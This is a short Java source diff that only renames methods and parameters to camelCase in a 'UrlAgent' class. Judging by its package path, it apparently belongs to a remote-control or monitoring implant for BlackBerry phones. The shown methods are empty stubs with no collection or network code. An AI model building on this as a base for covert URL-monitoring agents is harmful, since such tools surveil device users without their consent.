@@ -6,22 +6,22 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class UrlAgent extends Agent {
     static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);
 
-    public UrlAgent(int AgentStatus) {
-        super(Agent.AGENT_URL, AgentStatus, true);
+    public UrlAgent(int agentStatus) {
+        super(Agent.AGENT_URL, agentStatus, true);
     }
 
-    protected UrlAgent(int AgentStatus, byte[] confParams) {
-        this(AgentStatus);
-        Parse(confParams);
+    protected UrlAgent(int agentStatus, byte[] confParams) {
+        this(agentStatus);
+        parse(confParams);
     }
 
-    public void AgentRun() {
+    public void agentRun() {
         debug.trace("run");
 
-        this.SleepUntilStopped();
+        this.sleepUntilStopped();
     }
 
-    protected boolean Parse(byte[] confParameters) {
+    protected boolean parse(byte[] confParameters) {
         // TODO Auto-generated method stub
         return false;
     }
